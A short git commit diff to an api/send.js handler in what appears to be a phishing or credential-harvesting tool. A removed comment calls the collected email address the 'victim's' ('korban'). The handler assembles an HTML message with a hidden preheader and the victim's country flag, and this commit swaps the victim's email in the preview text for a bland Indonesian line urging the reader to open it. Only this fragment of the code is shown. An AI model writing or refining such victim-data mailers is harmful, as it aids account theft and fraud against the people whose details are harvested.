2bf29e75f8d63408dfbeb70d5da95241457515be
Doken123 <medikaputra5@gmail.com>
2026-09-20 20:13:01 +0700

    Update send.js

--- api/send.js
+++ api/send.js
@@ -50,8 +50,8 @@ export default async function handler(req, res) {
 
         const flag = countryFlag(d.negaraKode || "");
 
-        // Preview text = email korban
-        const previewText = (d.email || "-");
+        // Preview text dibuat netral — tanpa IP/bendera
+        const previewText = "Silakan buka untuk melihat detail informasi akun.";
 
         const htmlBody = `
 <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">
